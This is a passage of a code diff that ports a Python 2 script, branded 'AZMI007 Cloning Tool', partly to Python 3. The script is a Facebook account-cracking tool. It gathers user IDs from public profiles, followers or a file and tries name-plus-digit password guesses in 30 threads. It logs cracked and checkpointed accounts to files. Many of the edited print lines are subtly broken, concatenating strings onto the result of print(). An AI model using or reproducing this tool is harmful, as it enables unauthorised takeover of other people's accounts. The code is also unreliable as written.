                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4
+                            print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass4
                             cp = open('AZMI_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -857,13 +857,13 @@ def c_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass5
+                                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass5
                                 cp = open('AZMI_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -872,13 +872,13 @@ def c_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass6
+                                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass6
                                     cp = open('AZMI_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -888,10 +888,10 @@ def c_s():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print 47 * '-'
-    print ' \x1b[1;92mCrack Done'
-    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
-    print 47 * '-'
+    print(47 * '-')
+    print(" \x1b[1;92mCrack Done")
+    print("\x1b[1;92m Total Ok/Cp:") + str(len(oks)) + '/' + str(len(cps))
+    print(47 * '-')
     raw_input('\x1b[1;93m Press enter to back')
     choice_crack()
 
@@ -902,20 +902,20 @@ def crack_b():
         toket = open('login.txt', 'r').read()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
+        print(logo)
         print '\t File Not Found \x1b[0;97m'
         print ''
         time.sleep(1)
         log_menu()
 
     os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print(logo)
+    print("\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m")
+    print(47 * '-')
+    print("\x1b[1;92m[1] Public id cloning")
+    print("\x1b[1;92m[2] Followers cloning")
+    print("\x1b[1;92m[3] File cloning")
+    print("\x1b[1;92m[0] Back")
     a_s()
 
 
@@ -925,20 +925,20 @@ def name_crack():
         token = open('access_token.txt', 'r').read()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
-        print '\t Login FB id to continue\x1b[0;97m'
-        print ''
+        print(logo)
+        print("\t Login FB id to continue\x1b[0;97m")
+        print(" ")
         time.sleep(1)
         log_menu()
 
     os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print(logo)
+    print("\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m")
+    print(47 * '-')
+    print("\x1b[1;92m[1] Public id cloning")
+    print("\x1b[1;92m[2] Followers cloning")
+    print("\x1b[1;92m[3] File cloning")
+    print("\x1b[1;92m[0] Back")
     n_s()
 
 
@@ -949,11 +949,11 @@ def n_s():
     a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Azmi\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print("\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m")
+        print(47 * '-')
         p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
@@ -968,11 +968,11 @@ def n_s():
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print(logo)
+            print("\x1b[1;93m~~~~Name pass public cracking~~~~")
+            print(" \x1b[1;92mCloning from: ") + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
+            print("\t Invalid user \x1b[0;97m")
             raw_input(' \x1b[1;92mPress enter to try again ')
             name_crack()
 
@@ -986,11 +986,11 @@ def n_s():
 
     elif a_s == '2':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print(" \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m")
+        print(47 * '-')
         p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
@@ -1001,11 +1001,11 @@ def n_s():
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print(logo)
+            print("\x1b[1;93m~~~~ Name pass followers cracking ~~~~")
+            print(" \x1b[1;92mCloning from: ") + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
+            print("\t Invalid user \x1b[0;97m")
             raw_input('\x1b[1;92mPress enter to try again ')
             auto_crack()
 
@@ -1019,11 +1019,11 @@ def n_s():
 
     elif a_s == '3':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print ("\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m")
+        print(47 * '-')
         p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
@@ -1038,23 +1038,23 @@ def n_s():
                 id.append(line.strip())
 
         except IOError:
-            print '[!] File Not Found.'
+            print("[!] File Not Found.")
             raw_input('Press Enter To Back. ')
             crack()
 
     elif a_s == '0':
         menu()
     else:
-        print ''
-        print '\tChoose valid option' + w
+        print(" ")
+        print("\tChoose valid option") + w
         a_s()
-    print ' Total ids: ' + str(len(id))
+    print(" Total ids: ") + str(len(id))
     time.sleep(0.5)
-    print ' \x1b[1;97mCrack Running\x1b[1;91m '
+    print(" \x1b[1;97mCrack Running\x1b[1;91m ")
     time.sleep(0.5)
-    print 47 * '-'
-    print '\t\x1b[1;94m{AZMI007} {Cloning Tool}\x1b[1;91m'
-    print 47 * '-'
+    print(47 * '-')
+    print("\t\x1b[1;94m{AZMI007} {Cloning Tool}\x1b[1;91m")
+    print(47 * '-')
 
     def main(arg):
         user = arg
@@ -1064,13 +1064,13 @@ def n_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1
+                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass1
                 cp = open('AZMI_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -1080,13 +1080,13 @@ def n_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2
+                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass2
                     cp = open('AZMI_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -1096,13 +1096,13 @@ def n_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3
+                        print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass3
                         cp = open('AZMI_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -1112,13 +1112,13 @@ def n_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4
+                            print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass4
                             cp = open('AZMI_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -1127,13 +1127,13 @@ def n_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass5
+                                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass5
                                 cp = open('AZMI_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -1142,13 +1142,13 @@ def n_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass6
+                                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass6
                                     cp = open('AZMI_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -1157,13 +1157,13 @@ def n_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass7
+                                        print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass7
                                         cp = open('AZMI_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -1172,13 +1172,13 @@ def n_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass8
+                                            print("\x1b[1;31;1m[CP] ")  + uid + ' | ' + pass8
                                             cp = open('AZMI_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
@@ -1188,10 +1188,10 @@ def n_s():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print 47 * '-'
-    print ' \x1b[1;92mCrack Done'
-    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
-    print 47 * '-'
+    print(47 * '-')
+    print(" \x1b[1;92mCrack Done")
+    print(" \x1b[1;92mTotal Ok/\x1b[1;31;1mCp:") + str(len(oks)) + '/' + str(len(cps))
+    print(47 * '-')
     raw_input(' \x1b[1;93mPress enter to back')
     auto_crack()
 
